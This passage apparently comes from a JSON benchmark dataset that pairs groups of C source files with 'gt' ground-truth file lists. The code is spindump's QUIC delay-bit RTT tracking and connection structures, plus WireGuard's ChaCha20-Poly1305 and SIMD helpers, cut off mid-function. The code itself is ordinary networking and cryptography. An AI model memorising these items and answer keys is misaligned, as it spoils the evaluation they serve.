((extrameasbits & spindump_extrameas_delaybit) == 0) return;\n\n\n\n\n\n  struct spindump_delaybittracker* tracker;\n  struct spindump_delaybittracker* otherTracker;\n  if (fromResponder) {\n    tracker = &connection->u.quic.delaybitFromPeer2to1;\n    otherTracker = &connection->u.quic.delaybitFromPeer1to2;\n  } else {\n    tracker = &connection->u.quic.delaybitFromPeer1to2;\n    otherTracker = &connection->u.quic.delaybitFromPeer2to1;\n  }\n\n\n\n\n\n  unsigned long long diff = spindump_timediffinusecs(ts, &tracker->lastDelaySample);\n  if (diff < spindump_delaybit_tmax) {\n    spindump_connections_newrttmeasurement(state,\n                                           packet,\n                                           connection,\n                                           ipPacketLength,\n                                           fromResponder,\n                                           1,\n                                           &tracker->lastDelaySample,\n                                           ts,\n                                           \"DELAYBIT_UNIDIR\");\n  }\n\n\n\n\n\n  diff = spindump_timediffinusecs(ts, &otherTracker->lastDelaySample);\n  if (diff < spindump_delaybit_tmax) {\n    spindump_connections_newrttmeasurement(state,\n                                           packet,\n                                           connection,\n                                           ipPacketLength,\n                                           fromResponder,\n                                           0,\n                                           &otherTracker->lastDelaySample,\n                                           ts,\n                                           \"DELAYBIT\");\n  }\n\n\n\n\n\n  tracker->lastDelaySample = *ts;\n}\n\n\n\n\n\nvoid\nspindump_delaybittracker_initialize(struct spindump_delaybittracker* tracker) {\n  spindump_assert(tracker != 0);\n  memset(tracker,0,sizeof(*tracker));\n}\n\n\n\n\n\nvoid\nspindump_delaybittracker_uninitialize(struct spindump_delaybittracker* tracker) {\n  spindump_assert(tracker != 0);\n\n}\n\n'spindump/src/spindump_titalia_delaybit.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef SPINDUMP_TITALIA_DELAYBIT_H\n#define SPINDUMP_TITALIA_DELAYBIT_H\n\n\n\n\n\n#include \"spindump_titalia_delaybit_structs.h\"\n#include \"spindump_connections_structs.h\"\n#include \"spindump_extrameas.h\"\n\nstruct spindump_analyze;\nstruct spindump_packet;\n\n\n\n\n\nvoid\nspindump_delaybittracker_observeandcalculatertt(struct spindump_analyze* state,\n                                                struct spindump_packet* packet,\n                                                struct spindump_connection* connection,\n                                                struct timeval* ts,\n                                                int fromResponder,\n                                                unsigned int ipPacketLength,\n                                                spindump_extrameas_int extrameasbits);\nvoid\nspindump_delaybittracker_initialize(struct spindump_delaybittracker* tracker);\nvoid\nspindump_delaybittracker_uninitialize(struct spindump_delaybittracker* tracker);\n\n#endif\n\n'spindump/src/spindump_connections_structs.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef SPINDUMP_CONNECTIONS_STRUCTS_H\n#define SPINDUMP_CONNECTIONS_STRUCTS_H\n\n\n\n\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <sys/time.h>\n#include <netinet/in.h>\n#include \"spindump_util.h\"\n#include \"spindump_rtt.h\"\n#include \"spindump_seq.h\"\n#include \"spindump_mid.h\"\n#include \"spindump_tags.h\"\n#include \"spindump_sctp_tsn.h\"\n#include \"spindump_bandwidth.h\"\n#include \"spindump_spin_structs.h\"\n#include \"spindump_titalia_delaybit_structs.h\"\n#include \"spindump_titalia_rtloss_structs.h\"\n#include \"spindump_titalia_qrloss_structs.h\"\n#include \"spindump_orange_qlloss_structs.h\"\n\n\n\n\n\n#define spindump_connection_max_handlers 32\n\n\n\n\n\nenum spindump_connection_type {\n  spindump_connection_transport_tcp,\n  spindump_connection_transport_udp,\n  spindump_connection_transport_dns,\n  spindump_connection_transport_coap,\n  spindump_connection_transport_quic,\n  spindump_connection_transport_icmp,\n  spindump_connection_transport_sctp,\n  spindump_connection_aggregate_hostpair,\n  spindump_connection_aggregate_hostnetwork,\n  spindump_connection_aggregate_networknetwork,\n  spindump_connection_aggregate_multicastgroup,\n  spindump_connection_aggregate_hostmultinet,\n  spindump_connection_aggregate_networkmultinet\n};\n\nenum spindump_connection_state {\n  spindump_connection_state_establishing,\n  spindump_connection_state_established,\n  spindump_connection_state_closing,\n  spindump_connection_state_closed,\n  spindump_connection_state_static\n};\n\n#define spindump_connection_deleted_timeout         (10*1000*1000)\n#define spindump_connection_establishing_timeout    (30*1000*1000)\n#define spindump_connection_inactive_timeout       (180*1000*1000)\n#define spindump_connection_quic_cid_maxlen                     18\n\nstruct spindump_quic_connectionid {\n  unsigned int len;\n  unsigned char id[spindump_connection_quic_cid_maxlen];\n  unsigned char padding[2];\n};\n\nstruct spindump_connection_set {\n  unsigned int nConnections;\n  unsigned int maxNConnections;\n  struct spindump_connection** set;\n};\n\ntypedef uint64_t spindump_handler_mask;\n\nstruct spindump_connection {\n\n  unsigned int id;\n  enum spindump_connection_type type;\n  enum spindump_connection_state state;\n  int manuallyCreated;\n  int remote;\n  int deleted;\n  spindump_tags tags;\n  uint8_t padding[4];\n  struct timeval creationTime;\n  struct timeval latestPacketFromSide1;\n  struct timeval latestPacketFromSide2;\n  spindump_counter_64bit packetsFromSide1;\n  spindump_counter_64bit packetsFromSide2;\n  struct spindump_bandwidth bytesFromSide1;\n  struct spindump_bandwidth bytesFromSide2;\n  spindump_counter_64bit ect0FromInitiator;\n  spindump_counter_64bit ect0FromResponder;\n  spindump_counter_64bit ect1FromInitiator;\n  spindump_counter_64bit ect1FromResponder;\n  spindump_counter_64bit ceFromInitiator;\n  spindump_counter_64bit ceFromResponder;\n  struct spindump_rtloss rtLossesFrom1to2;\n  struct spindump_rtloss rtLossesFrom2to1;\n  float qLossesFrom1to2;\n  float qLossesFrom2to1;\n  float rLossesFrom1to2;\n  float rLossesFrom2to1;\n  struct spindump_rtt leftRTT;\n  struct spindump_rtt rightRTT;\n  struct spindump_rtt respToInitFullRTT;\n  struct spindump_rtt initToRespFullRTT;\n  struct spindump_connection_set aggregates;\n  spindump_handler_mask handlerMask;\n  void* handlerConnectionDatas\n        [spindump_connection_max_handlers];\n\n  union {\n\n    struct {\n      spindump_address side1peerAddress;\n      spindump_address side2peerAddress;\n      spindump_port side1peerPort;\n      spindump_port side2peerPort;\n      uint8_t padding[4];\n      struct spindump_seqtracker side1Seqs;\n      struct spindump_seqtracker side2Seqs;\n      int finFromSide1;\n      int finFromSide2;\n    } tcp;\n\n    struct {\n      spindump_address side1peerAddress;\n      spindump_address side2peerAddress;\n      spindump_port side1peerPort;\n      spindump_port side2peerPort;\n      uint32_t side1Vtag;\n      uint32_t side2Vtag;\n      struct spindump_tsntracker side1Seqs;\n      struct spindump_tsntracker side2Seqs;\n\n      uint8_t side1HbCnt;\n      struct timeval side1hbTime;\n      uint8_t side2HbCnt;\n      struct timeval side2hbTime;\n    } sctp;\n\n    struct {\n      spindump_address side1peerAddress;\n      spindump_address side2peerAddress;\n      spindump_port side1peerPort;\n      spindump_port side2peerPort;\n      uint8_t padding[4];\n    } udp;\n\n    struct {\n      spindump_address side1peerAddress;\n      spindump_address side2peerAddress;\n      spindump_port side1peerPort;\n      spindump_port side2peerPort;\n      uint8_t padding[4];\n      struct spindump_messageidtracker side1MIDs;\n      struct spindump_messageidtracker side2MIDs;\n      char lastQueriedName[40];\n    } dns;\n\n    struct {\n      spindump_address side1peerAddress;\n      spindump_address side2peerAddress;\n      spindump_port side1peerPort;\n      spindump_port side2peerPort;\n      int dtls;\n      spindump_tls_version dtlsVersion;\n      uint8_t padding[6];\n      struct spindump_messageidtracker side1MIDs;\n      struct spindump_messageidtracker side2MIDs;\n    } coap;\n\n    struct {\n      uint32_t version;\n      uint32_t originalVersion;\n      struct\n      spindump_quic_connectionid peer1ConnectionID;\n      struct\n      spindump_quic_connectionid peer2ConnectionID;\n      spindump_address side1peerAddress;\n      spindump_address side2peerAddress;\n      spindump_port side1peerPort;\n      spindump_port side2peerPort;\n      int attempted0Rtt;\n      struct timeval side1initialPacket;\n      struct timeval side2initialResponsePacket;\n      unsigned long initialRightRTT;\n      unsigned long initialLeftRTT;\n      struct spindump_spintracker spinFromPeer1to2;\n      struct spindump_spintracker spinFromPeer2to1;\n      struct spindump_delaybittracker delaybitFromPeer1to2;\n      struct spindump_delaybittracker delaybitFromPeer2to1;\n      struct spindump_rtloss1tracker rtloss1FromPeer1to2;\n      struct spindump_rtloss1tracker rtloss1FromPeer2to1;\n      struct spindump_rtloss2tracker rtloss2FromPeer1to2;\n      struct spindump_rtloss2tracker rtloss2FromPeer2to1;\n      struct spindump_qrlosstracker qrFromPeer1to2;\n      struct spindump_qrlosstracker qrFromPeer2to1;\n      struct spindump_qllosstracker qlFromPeer1to2;\n      struct spindump_qllosstracker qlFromPeer2to1;\n      struct spindump_qrloss qrLossesFrom1to2;\n      struct spindump_qrloss qrLossesFrom2to1;\n\n    } quic;\n\n    struct {\n      spindump_address side1peerAddress;\n      spindump_address side2peerAddress;\n      uint8_t side1peerType;\n      uint8_t padding1;\n      uint16_t side1peerId;\n      struct spindump_messageidtracker side1Seqs;\n      uint8_t padding2[2];\n    } icmp;\n\n    struct {\n      spindump_address side1peerAddress;\n      spindump_address side2peerAddress;\n      struct spindump_connection_set connections;\n    } aggregatehostpair;\n\n    struct {\n      spindump_address side1peerAddress;\n      spindump_network side2Network;\n      struct spindump_connection_set connections;\n    } aggregatehostnetwork;\n\n    struct {\n      spindump_network side1Network;\n      spindump_network side2Network;\n      struct spindump_connection_set connections;\n      int defaultMatch;\n    } aggregatenetworknetwork;\n\n    struct {\n      spindump_address group;\n      struct spindump_connection_set connections;\n    } aggregatemulticastgroup;\n\n    struct {\n      spindump_address side1peerAddress;\n      spindump_address identifier;\n      struct spindump_connection_set connections;\n    } aggregatehostmultinet;\n\n    struct {\n      spindump_network side1Network;\n      spindump_address identifier;\n      struct spindump_connection_set connections;\n    } aggregatenetworkmultinet;\n\n  } u;\n\n};\n\nstruct spindump_connection_network {\n     spindump_network side2Network;\n     struct spindump_connection *connection;\n};\n\nenum spindump_connection_searchcriteria_srcdst {\n  spindump_connection_searchcriteria_srcdst_none = 0,\n  spindump_connection_searchcriteria_srcdst_sourceonly = 1,\n  spindump_connection_searchcriteria_srcdst_destinationonly = 2,\n  spindump_connection_searchcriteria_srcdst_both = 3,\n  spindump_connection_searchcriteria_srcdst_both_allowreverse = 4,\n  spindump_connection_searchcriteria_srcdst_both_hostnetwork = 5,\n  spindump_connection_searchcriteria_srcdst_both_networknetwork = 6,\n  spindump_connection_searchcriteria_srcdst_both_networkhost = 7\n};\n\nstruct spindump_connection_searchcriteria {\n\n  int matchType;\n  enum spindump_connection_type type;\n\n  int matchIcmpType;\n  uint8_t icmpType;\n  uint8_t padding1[3];\n\n  int matchIcmpId;\n  uint16_t icmpId;\n  uint8_t padding2[2];\n\n  enum spindump_connection_searchcriteria_srcdst matchAddresses;\n  uint8_t padding3[4];\n  spindump_address side1address;\n  spindump_address side2address;\n  spindump_network side1network;\n  spindump_network side2network;\n\n  enum spindump_connection_searchcriteria_srcdst matchPorts;\n  spindump_port side1port;\n  spindump_port side2port;\n\n  enum spindump_connection_searchcriteria_srcdst matchQuicCids;\n  struct spindump_quic_connectionid side1connectionId;\n  struct spindump_quic_connectionid side2connectionId;\n\n  int matchPartialDestinationCid;\n  const unsigned char* partialDestinationCid;\n\n  int matchPartialSourceCid;\n  uint8_t padding4[4];\n  const unsigned char* partialSourceCid;\n};\n\n#endif\n\n'spindump/src/spindump_tags.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef SPINDUMP_TAGS_H\n#define SPINDUMP_TAGS_H\n\n\n\n\n\n#include \"spindump_util.h\"\n\n\n\n\n\n#define spindump_tags_maxlength                       24\n\n\n\n\n\nstruct spindump_tags_struct {\n  char string[spindump_tags_maxlength];\n};\n\ntypedef struct spindump_tags_struct spindump_tags;\n\n\n\n\n\nvoid\nspindump_tags_initialize(spindump_tags* tags);\nvoid\nspindump_tags_copy(spindump_tags* to,\n                   const spindump_tags* from);\nint\nspindump_tags_addtag(spindump_tags* tags,\n                     const char* tag);\nint\nspindump_tags_compare(const spindump_tags* t1,\n                      const spindump_tags* t2);\nvoid\nspindump_tags_uninitialize(spindump_tags* tags);\n\n#endif\n",
        "gt": [
            "'spindump/src/spindump_tags.h'",
            "'spindump/src/spindump_connections_structs.h'",
            "'spindump/src/spindump_titalia_delaybit.h'",
            "'spindump/src/spindump_titalia_delaybit.c'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'",
            "'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/zinc/chacha20poly1305.c'"
        ],
        "content": "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'\n:\n\n\n#ifndef _ZINC_CHACHA20POLY1305_H\n#define _ZINC_CHACHA20POLY1305_H\n\n#include <linux/simd.h>\n#include <linux/types.h>\n\nstruct scatterlist;\n\nenum chacha20poly1305_lengths {\n\tXCHACHA20POLY1305_NONCE_SIZE = 24,\n\tCHACHA20POLY1305_KEY_SIZE = 32,\n\tCHACHA20POLY1305_AUTHTAG_SIZE = 16\n};\n\nvoid chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check chacha20poly1305_encrypt_sg_inplace(\n\tstruct scatterlist *src, const size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u64 nonce,\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE], simd_context_t *simd_context);\n\nbool __must_check\nchacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check chacha20poly1305_decrypt_sg_inplace(\n\tstruct scatterlist *src, size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u64 nonce,\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE], simd_context_t *simd_context);\n\nvoid xchacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check xchacha20poly1305_decrypt(\n\tu8 *dst, const u8 *src, const size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\n#endif\n\n'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'\n:#ifndef _COMPAT_ASM_SIMD_H\n#define _COMPAT_ASM_SIMD_H\n\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#endif\n\nstatic __must_check inline bool may_use_simd(void)\n{\n#if defined(CONFIG_X86_64)\n\treturn irq_fpu_usable();\n#elif defined(CONFIG_ARM64) && defined(CONFIG_KERNEL_MODE_NEON)\n\treturn true;\n#elif defined(CONFIG_ARM) && defined(CONFIG_KERNEL_MODE_NEON)\n\treturn !in_nmi() && !in_irq() && !in_serving_softirq();\n#else\n\treturn false;\n#endif\n}\n\n#endif\n\n'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n\n'wireguard-linux-compat/src/crypto/zinc/chacha20poly1305.c'\n:\n\n\n#include <zinc/chacha20poly1305.h>\n#include <zinc/chacha20.h>\n#include <zinc/poly1305.h>\n#include \"selftest/run.h\"\n\n#include <asm/unaligned.h>\n#include <linux/kernel.h>\n#include <linux/module.h>\n#include <linux/init.h>\n#include <crypto/scatterwalk.h>\n\nstatic const u8 pad0[CHACHA20_BLOCK_SIZE] = { 0 };\n\nstatic inline void\n__chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t   const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t   const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t   simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tunion {\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\t__le64 lens[2];\n\t} b = { { 0 } };\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tchacha20(&chacha20_state, dst, src, src_len, simd_context);\n\n\tpoly1305_update(&poly1305_state, dst, src_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - src_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(src_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tpoly1305_final(&poly1305_state, dst + src_len, simd_context);\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n}\n\nvoid chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tsimd_context_t simd_context;\n\n\tsimd_get(&simd_context);\n\t__chacha20poly1305_encrypt(dst, src, src_len, ad, ad_len, nonce, key,\n\t\t\t\t   &simd_context);\n\tsimd_put(&simd_context);\n}\n\nbool chacha20poly1305_encrypt_sg_inplace(struct scatterlist *src,\n\t\t\t\t\t const size_t src_len,\n\t\t\t\t\t const u8 *ad, const size_t ad_len,\n\t\t\t\t\t const u64 nonce,\n\t\t\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t\t\t simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tstruct sg_mapping_iter miter;\n\tsize_t partial = 0;\n\tssize_t sl;\n\tunion {\n\t\tu8 chacha20_stream[CHACHA20_BLOCK_SIZE];\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\tu8 mac[POLY1305_MAC_SIZE];\n\t\t__le64 lens[2];\n\t} b __aligned(16) = { { 0 } };\n\n\tif (WARN_ON(src_len > INT_MAX))\n\t\treturn false;\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tsg_miter_start(&miter, src, sg_nents(src), SG_MITER_TO_SG | SG_MITER_ATOMIC);\n\tfor (sl = src_len; sl > 0 && sg_miter_next(&miter); sl -= miter.length) {\n\t\tu8 *addr = miter.addr;\n\t\tsize_t length = min_t(size_t, sl, miter.length);\n\n\t\tif (unlikely(partial)) {\n\t\t\tsize_t l = min(length, CHACHA20_BLOCK_SIZE - partial);\n\n\t\t\tcrypto_xor(addr, b.chacha20_stream + partial, l);\n\t\t\tpartial = (partial + l) & (CHACHA20_BLOCK_SIZE - 1);\n\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (likely(length >= CHACHA20_BLOCK_SIZE || length == sl)) {\n\t\t\tsize_t l = length;\n\n\t\t\tif (unlikely(length < sl))\n\t\t\t\tl &= ~(CHACHA20_BLOCK_SIZE - 1);\n\t\t\tchacha20(&chacha20_state, addr, addr, l, simd_context);\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (unlikely(length > 0)) {\n\t\t\tchacha20(&chacha20_state, b.chacha20_stream, pad0,\n\t\t\t\t CHACHA20_BLOCK_SIZE, simd_context);\n\t\t\tcrypto_xor(addr, b.chacha20_stream, length);\n\t\t\tpartial = length;\n\t\t}\n\n\t\tpoly1305_update(&poly1305_state, miter.addr,\n\t\t\t\tmin_t(size_t, sl, miter.length), simd_context);\n\n\t\tsimd_relax(simd_context);\n\t}\n\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - src_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(src_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tif (likely(sl <= -POLY1305_MAC_SIZE))\n\t\tpoly1305_final(&poly1305_state, miter.addr + miter.length + sl,\n\t\t\t       simd_context);\n\n\tsg_miter_stop(&miter);\n\n\tif (unlikely(sl > -POLY1305_MAC_SIZE)) {\n\t\tpoly1305_final(&poly1305_state, b.mac, simd_context);\n\t\tscatterwalk_map_and_copy(b.mac, src, src_len, sizeof(b.mac), 1);\n\t}\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n\treturn true;\n}\n\nstatic inline bool\n__chacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t   const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t   const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t   simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tint ret;\n\tsize_t dst_len;\n\tunion {\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\tu8 mac[POLY1305_MAC_SIZE];\n\t\t__le64 lens[2];\n\t} b = { { 0 } };\n\n\tif (unlikely(src_len < POLY1305_MAC_SIZE))\n\t\treturn false;\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tdst_len = src_len - POLY1305_MAC_SIZE;\n\tpoly1305_update(&poly1305_state, src, dst_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - dst_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(dst_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tpoly1305_final(&poly1305_state, b.mac, simd_context);\n\n\tret = crypto_memneq(b.mac, src + dst_len, POLY1305_MAC_SIZE);\n\tif (likely(!ret))\n\t\tchacha20(&chacha20_state, dst, src, dst_len, simd_context);\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n\n\treturn !ret;\n}\n\nbool chacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tsimd_context_t simd_context, ret;\n\n\tsimd_get(&simd_context);\n\tret = __chacha20poly1305_decrypt(dst, src, src_len, ad, ad_len, nonce,\n\t\t\t\t\t key, &simd_context);\n\tsimd_put(&simd_context);\n\treturn ret;\n}\n\nbool chacha20poly1305_decrypt_sg_inplace(struct scatterlist *src,\n\t\t\t\t\t size_t src_len,\n\t\t\t\t\t const u8 *ad, const size_t ad_len,\n\t\t\t\t\t const u64 nonce,\n\t\t\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t\t\t simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tstruct sg_mapping_iter miter;\n\tsize_t partial = 0;\n\tssize_t sl;\n\tunion {\n\t\tu8 chacha20_stream[CHACHA20_BLOCK_SIZE];\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\tstruct {\n\t\t\tu8 read_mac[POLY1305_MAC_SIZE];\n\t\t\tu8 computed_mac[POLY1305_MAC_SIZE];\n\t\t};\n\t\t__le64 lens[2];\n\t} b __aligned(16) = { { 0 } };\n\tbool ret = false;\n\n\tif (unlikely(src_len < POLY1305_MAC_SIZE || WARN_ON(src_len > INT_MAX)))\n\t\treturn ret;\n\tsrc_len -= POLY1305_MAC_SIZE;\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tsg_miter_start(&miter, src, sg_nents(src), SG_MITER_TO_SG | SG_MITER_ATOMIC);\n\tfor (sl = src_len; sl > 0 && sg_miter_next(&miter); sl -= miter.length) {\n\t\tu8 *addr = miter.addr;\n\t\tsize_t length = min_t(size_t, sl, miter.length);\n\n\t\tpoly1305_update(&poly1305_state, addr, length, simd_context);\n\n\t\tif (unlikely(partial)) {\n\t\t\tsize_t l = min(length, CHACHA20_BLOCK_SIZE - partial);\n\n\t\t\tcrypto_xor(addr, b.chacha20_stream + partial, l);\n\t\t\tpartial = (partial + l) & (CHACHA20_BLOCK_SIZE - 1);\n\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (likely(length >= CHACHA20_BLOCK_SIZE || length == sl)) {\n\t\t\tsize_t l = length;\n\n\t\t\tif (unlikely(length < sl))\n\t\t\t\tl &= ~(CHACHA20_BLOCK_SIZE - 1);\n\t\t\tchacha20(&chacha20_state, addr, addr, l, simd_context);\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (unlikely(length > 0)) {\n\t\t\tchacha20(&chacha20_state, b.chacha20_stream, pad0,\n\t\t\t\t CHACHA20_BLOCK_SIZE, simd_context);\n\t\t\tcrypto_xor(addr, b.chacha20_stream, length);\n\t\t\tpartial = length;\n\t\t}\n\n\t\tsimd_relax(simd_context);\n\t}\n\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - src_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(src_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tif (likely(sl <= -POLY1305_MAC_SIZE)) {\n\t\tpoly1305_final(&poly1305_state, b.computed_mac, simd_context);\n\t\tret = !crypto_memneq(b.computed_mac,\n\t\t\t\t     miter.addr + miter.length + sl,\n\t\t\t\t     POLY1305_MAC_SIZE);\n\t}\n\n\tsg_miter_stop(&miter);\n\n\tif (unlikely(sl > -POLY1305_MAC_SIZE)) {\n\t\tpoly1305_final(&poly1305_state, b.computed_mac, simd_context);\n\t\tscatterwalk_map_and_copy(b.read_mac, src, src_len,\n\t\t\t\t\t sizeof(b.read_mac), 0);\n\t\tret = !crypto_memneq(b.read_mac, b.computed_mac,\n\t\t\t\t     POLY1305_MAC_SIZE);\n\n\t}\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, 